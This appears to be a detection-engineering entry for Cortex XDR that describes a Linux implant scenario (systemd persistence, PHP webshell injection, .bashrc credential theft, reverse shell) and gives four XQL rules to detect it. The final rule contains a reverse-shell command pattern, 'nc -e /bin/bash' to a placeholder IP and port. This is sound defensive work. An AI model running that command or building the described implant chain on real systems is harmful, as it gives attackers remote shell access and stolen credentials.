identity.description: An implant installs a systemd service for persistence, injects a PHP webshell via auto_prepend_file, steals credentials from .bashrc, and executes an in-memory reverse shell. Cortex should detect the service creation, file modifications, and network activity.

techniques.name: Create or Modify System Process: Systemd Service

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Systemd Service Creation
biocs.description: Detection of new systemd service file creation
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.FILE and event_sub_type = ENUM.FILE_CREATE
| filter action_file_path = '/etc/systemd/system/sys-update.service'
| filter actor_process_image_name = 'systemd'

biocs.name: PHP Webshell Injection
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'php'
| filter actor_process_image_name = 'php'
| filter action_process_cmdline contains 'auto_prepend_file'

biocs.name: Bashrc Credential Theft
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.FILE and event_sub_type = ENUM.FILE_MODIFY
| filter action_file_path = '/home/www-data/.bashrc'
| filter actor_process_image_name = 'bash'

biocs.name: In-Memory Reverse Shell
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name = 'bash'
| filter action_process_cmdline contains 'nc -e /bin/bash 192.0.2.100 4444'
